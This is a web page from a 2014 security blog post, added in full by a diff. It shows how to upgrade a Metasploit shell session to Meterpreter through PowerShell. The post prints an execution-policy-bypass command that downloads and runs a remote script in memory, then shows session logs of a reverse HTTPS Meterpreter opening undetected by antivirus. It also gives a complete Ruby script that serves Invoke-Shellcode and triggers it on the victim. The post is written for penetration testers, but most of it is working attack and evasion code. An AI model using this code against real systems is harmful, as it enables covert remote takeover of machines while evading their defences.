@@ -1,0 +1,704 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>meterpreter shell upgrades using powershell - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="One of my primary goals during development of clusterd was ensuring reliability and covertness during remote deploys. It&rsquo;s no secret that &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Meterpreter Shell Upgrades Using Powershell</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-10T22:31:47-06:00" pubdate data-updated="true">Mar 10<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>One of my primary goals during development of <a href="https://github.com/hatRiot/clusterd">clusterd</a> was ensuring reliability and covertness during remote deploys.  It&rsquo;s no secret that antivirus routinely eats vanilla meterpreter shells.  For this, the <code>--gen-payload</code> flag generates a war file with <code>java/jsp_shell_reverse_tcp</code> tucked inside.  This is used due to it being largely undetected by AV, and our environments are perfectly suited for it.  However, Meterpreter is a fantastic piece of software, and it&rsquo;d be nice to be able to elevate from this simple JSP shell into it.</p>
+
+<p>Metasploit has a solution for this, sort of.  <code>sessions -u</code> can be used to upgrade an existing shell session into a full-blown Meterpreter.  Unfortunately, the current implementation uses <code>Rex::Exploitation::CmdStagerVBS</code>, which writes the executable to disk and executes it.  This is almost always immediately popped by most enterprise-grade (and even most consumer grade) AV&rsquo;s.  For this, we need a new solution.</p>
+
+<p>The easiest solution is Powershell; this allows us to execute shellcode completely in-memory, without ever bouncing files against disk.  I used Obscure Security&rsquo;s canonical <a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html">post</a> on it for my implementation.  The only problem really is portability, as Powershell doesn&rsquo;t exist on Windows XP.  This could be mitigated by patching in shellcode via Java, but that&rsquo;s another post for another time.</p>
+
+<p>Right, so how&rsquo;s this work?  We essentially execute a Powershell command in the running session (our generic shell) that fetches a payload from a remote server and executes it.  Our payload in this case is <a href="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1">Invoke-Shellcode</a>, from the PowerSploit package.  This bit of code will generate our reverse HTTPS meterpreter shell and inject it into the current process ID.  Our command looks like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc %s"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our encoded payload is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')</span></code></pre></td></tr></table></div></figure>
+
+
+<p>IEX, or Invoke-Expression, is just an eval operation.  In this case, we&rsquo;re fetching a URL and executing it.  This is a totally transparent, completely in-memory solution.  Let&rsquo;s have a look at it running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -l
+</span><span class='line'>
+</span><span class='line'>Active sessions
+</span><span class='line'>===============
+</span><span class='line'>
+</span><span class='line'>  Id  Type         Information                                                                       Connection
+</span><span class='line'>  --  ----         -----------                                                                       ----------
+</span><span class='line'>  1   shell linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.1.6:4444 -&gt; 192.168.1.102:60911 (192.168.1.102)
+</span><span class='line'>
+</span><span class='line'>msf exploit(handler) &gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We see above that we currently have a generic shell (it&rsquo;s the java/jsp_shell_reverse_tcp payload) on a Windows 7 system (which happens to be running MSE).  Using this new script, we can upgrade this session to Meterpreter:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -u 1
+</span><span class='line'>
+</span><span class='line'>[*] Started HTTPS reverse handler on https://0.0.0.0:53568/
+</span><span class='line'>[*] Starting the payload handler...
+</span><span class='line'>[*] 192.168.1.102:60922 Request received for /INITM...
+</span><span class='line'>[*] 192.168.1.102:60922 Staging connection for target /INITM received...
+</span><span class='line'>[*] Patched user-agent at offset 663128...
+</span><span class='line'>[*] Patched transport at offset 662792...
+</span><span class='line'>[*] Patched URL at offset 662856...
+</span><span class='line'>[*] Patched Expiration Timeout at offset 663728...
+</span><span class='line'>[*] Patched Communication Timeout at offset 663732...
+</span><span class='line'>[*] Meterpreter session 2 opened (192.168.1.6:53568 -&gt; 192.168.1.102:60922) at 2014-03-11 23:09:36 -0600
+</span><span class='line'>msf exploit(handler) &gt; sessions -i 2
+</span><span class='line'>[*] Starting interaction with 2...
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt; sysinfo
+</span><span class='line'>Computer        : BRYAN-PC
+</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
+</span><span class='line'>Architecture    : x64 (Current Process is WOW64)
+</span><span class='line'>System Language : en_US
+</span><span class='line'>Meterpreter     : x86/win32
+</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>And just like that, without a peep from MSE, we&rsquo;ve got a Meterpreter shell.</p>
+
+<p>You can find the code for this implementation below, though be warned; this is PoC quality code, and probably even worse as I&rsquo;m not really a Ruby developer.  Meatballs over at Metasploit has a few awesome Powershell pull requests waiting for a merge.  Once this is done, I can implement that here and submit a proper implementation.  If you&rsquo;d like to try this out, simply create a backup copy of <code>scripts/shell/spawn_meterpreter.rb</code> and copy in the following, then <code>reload</code>.  You should be upgradin&#8217; and bypassin&#8217; in no time.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+<span class='line-number'>184</span>
+<span class='line-number'>185</span>
+<span class='line-number'>186</span>
+<span class='line-number'>187</span>
+<span class='line-number'>188</span>
+<span class='line-number'>189</span>
+<span class='line-number'>190</span>
+<span class='line-number'>191</span>
+<span class='line-number'>192</span>
+<span class='line-number'>193</span>
+<span class='line-number'>194</span>
+<span class='line-number'>195</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#
+</span><span class='line'># Session upgrade using Powershell IEX
+</span><span class='line'># 
+</span><span class='line'># Some code stolen from jduck's original implementation
+</span><span class='line'>#
+</span><span class='line'># -drone
+</span><span class='line'>#
+</span><span class='line'>
+</span><span class='line'>class HTTPServer
+</span><span class='line'>    #
+</span><span class='line'>    # Using Ruby HTTPServer here since this isn't a module, and I can't figure
+</span><span class='line'>    # out how to use MSF libs in here
+</span><span class='line'>    #
+</span><span class='line'>    @sent = false
+</span><span class='line'>    def state
+</span><span class='line'>        return @sent
+</span><span class='line'>    end
+</span><span class='line'>
+</span><span class='line'>    def initialize(port, body)
+</span><span class='line'>        require 'socket'
+</span><span class='line'>
+</span><span class='line'>        @sent = false
+</span><span class='line'>        @server = Thread.new do
+</span><span class='line'>            server = TCPServer.open port
+</span><span class='line'>            loop do
+</span><span class='line'>                client = server.accept
+</span><span class='line'>                content_type = "text/plain"
+</span><span class='line'>                client.puts "HTTP/1.0 200 OK\r\nContent-type: #{content_type}"\
+</span><span class='line'>                            "\r\nContent-Length: #{body.length}\r\n\r\n#{body}"\
+</span><span class='line'>                            "\r\n\r\n"
+</span><span class='line'>                sleep 5
+</span><span class='line'>                client.close
+</span><span class='line'>                kill
+</span><span class='line'>            end
+</span><span class='line'>        end
+</span><span class='line'>     end
+</span><span class='line'>
+</span><span class='line'>     def kill!
+</span><span class='line'>        @sent = true
+</span><span class='line'>        @server.kill
+</span><span class='line'>     end
+</span><span class='line'>
+</span><span class='line'>     alias :kill :kill!
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>#
+</span><span class='line'># Returns if a port is used by a session
+</span><span class='line'>#
+</span><span class='line'>def is_port_used?(port)
+</span><span class='line'>    framework.sessions.each do |sid, obj|
+</span><span class='line'>       local_info = obj.instance_variable_get(:@local_info)
+</span><span class='line'>       return true if local_info =~ /:#{port}$/
+</span><span class='line'>    end
+</span><span class='line'>
+</span><span class='line'>    false
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>def start_http_service(port)
+</span><span class='line'>    @server = HTTPServer.new(port, @pl)
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>def wait_payload
+</span><span class='line'>
+</span><span class='line'>    waited = 0
+</span><span class='line'>    while (not @server.state)
+</span><span class='line'>        select(nil, nil, nil, 1)
+</span><span class='line'>        waited += 1
+</span><span class='line'>        if (waited &gt; 10) # MAGIC NUMBA
+</span><span class='line'>            @server.kill
+</span><span class='line'>            raise RuntimeError, "No payload requested"
+</span><span class='line'>        end
+</span><span class='line'>    end
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>def generate(host, port, sport)
+</span><span class='line'>    require 'net/http'
+</span><span class='line'>
+</span><span class='line'>    script_block = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % [host, sport]
+</span><span class='line'>    cmd = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol %s" % script_block
+</span><span class='line'>
+</span><span class='line'>    # generate powershell payload
+</span><span class='line'>    url = URI.parse('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
+</span><span class='line'>    req = Net::HTTP::Get.new(url.path)
+</span><span class='line'>    http = Net::HTTP.new(url.host, url.port)
+</span><span class='line'>    http.use_ssl = true
+</span><span class='line'>
+</span><span class='line'>    res = http.request(req)
+</span><span class='line'>
+</span><span class='line'>    if !res or res.code != '200'
+</span><span class='line'>      raise RuntimeError, "Could not retrieve Invoke-Shellcode"
+</span><span class='line'>    end
+</span><span class='line'>
+</span><span class='line'>    @pl = res.body
+</span><span class='line'>    @pl &lt;&lt; "\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force" % [host, port]
+</span><span class='line'>    return cmd
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#
+</span><span class='line'># Mimics what MSF already does if the user doesn't manually select a payload and lhost
+</span><span class='line'>#
+</span><span class='line'>lhost = framework.datastore['LHOST']
+</span><span class='line'>unless lhost
+</span><span class='line'>  lhost = Rex::Socket.source_address
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>#
+</span><span class='line'># If there is no LPORT defined in framework, then pick a random one that's not used
+</span><span class='line'># by current sessions. This is possible if the user assumes module datastore options
+</span><span class='line'># are the same as framework datastore options.
+</span><span class='line'>#
+</span><span class='line'>lport = framework.datastore['LPORT']
+</span><span class='line'>unless lport
+</span><span class='line'>  lport = 4444 # Default meterpreter port
+</span><span class='line'>  while is_port_used?(lport)
+</span><span class='line'>    # Pick a port that's not used
+</span><span class='line'>    lport = [*49152..65535].sample
+</span><span class='line'>  end
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'># do the same from above, but for the server port
+</span><span class='line'>sport = [*49152..65535].sample
+</span><span class='line'>while is_port_used?(sport)
+</span><span class='line'>    sport = [*49152..65535].sample
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'># maybe we want our sessions going to another instance?
+</span><span class='line'>use_handler = true
+</span><span class='line'>use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
+</span><span class='line'>
+</span><span class='line'>#
+</span><span class='line'># Spawn the handler if needed
+</span><span class='line'>#
+</span><span class='line'>aborted = false
+</span><span class='line'>begin
+</span><span class='line'>
+</span><span class='line'>  mh = nil
+</span><span class='line'>  payload_name = 'windows/meterpreter/reverse_https'
+</span><span class='line'>  if (use_handler)
+</span><span class='line'>      mh = framework.modules.create("exploit/multi/handler")
+</span><span class='line'>      mh.datastore['LPORT'] = lport
+</span><span class='line'>      mh.datastore['LHOST'] = lhost
+</span><span class='line'>      mh.datastore['PAYLOAD'] = payload_name
+</span><span class='line'>      mh.datastore['ExitOnSession'] = false
+</span><span class='line'>      mh.datastore['EXITFUNC'] = 'process'
+</span><span class='line'>      mh.exploit_simple(
+</span><span class='line'>        'LocalInput'     =&gt; session.user_input,
+</span><span class='line'>        'LocalOutput'    =&gt; session.user_output,
+</span><span class='line'>        'Payload'        =&gt; payload_name,
+</span><span class='line'>        'RunAsJob'       =&gt; true)
+</span><span class='line'>      # It takes a little time for the resources to get set up, so sleep for
+</span><span class='line'>      # a bit to make sure the exploit is fully working.  Without this,
+</span><span class='line'>      # mod.get_resource doesn't exist when we need it.
+</span><span class='line'>      select(nil, nil, nil, 0.5)
+</span><span class='line'>      if framework.jobs[mh.job_id.to_s].nil?
+</span><span class='line'>        raise RuntimeError, "Failed to start multi/handler - is it already running?"
+</span><span class='line'>      end
+</span><span class='line'>    end
+</span><span class='line'>
+</span><span class='line'>    # Generate our command and payload
+</span><span class='line'>    cmd = generate(lhost, lport, sport)
+</span><span class='line'>
+</span><span class='line'>    # start http service
+</span><span class='line'>    start_http_service(sport)
+</span><span class='line'>
+</span><span class='line'>    sleep 2 # give it a sec to startup
+</span><span class='line'>
+</span><span class='line'>    # execute command
+</span><span class='line'>    session.run_cmd(cmd)
+</span><span class='line'>
+</span><span class='line'>    if not @server.state
+</span><span class='line'>        # wait...
+</span><span class='line'>        wait_payload
+</span><span class='line'>    end
+</span><span class='line'>
+</span><span class='line'>rescue ::Interrupt
+</span><span class='line'>  # TODO: cleanup partial uploads!
+</span><span class='line'>  aborted = true
+</span><span class='line'>rescue =&gt; e
+</span><span class='line'>  print_error("Error: #{e}")
+</span><span class='line'>  aborted = true
+</span><span class='line'>end
+</span><span class='line'>
+</span><span class='line'>#
+</span><span class='line'># Stop the job
+</span><span class='line'>#
+</span><span class='line'>if (use_handler)
+</span><span class='line'>  Thread.new do
+</span><span class='line'>    if not aborted
+</span><span class='line'>      # Wait up to 10 seconds for the session to come in..
+</span><span class='line'>      select(nil, nil, nil, 10)
+</span><span class='line'>    end
+</span><span class='line'>    framework.jobs.stop_job(mh.job_id)
+</span><span class='line'>  end
+</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-10T22:31:47-06:00" pubdate data-updated="true">Mar 10<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/metasploit/'>metasploit</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/03/02/introduction/" title="Previous Post: introduction">&laquo; introduction</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/">meterpreter shell upgrades using powershell</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/24/ganib-project-management-2.3-sqli/">ganib project management 2.3 SQLi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/">Fetching JBoss MBean method hashes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/">Dolibarr 3.4.0 - Multiple Vulnerabilities</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
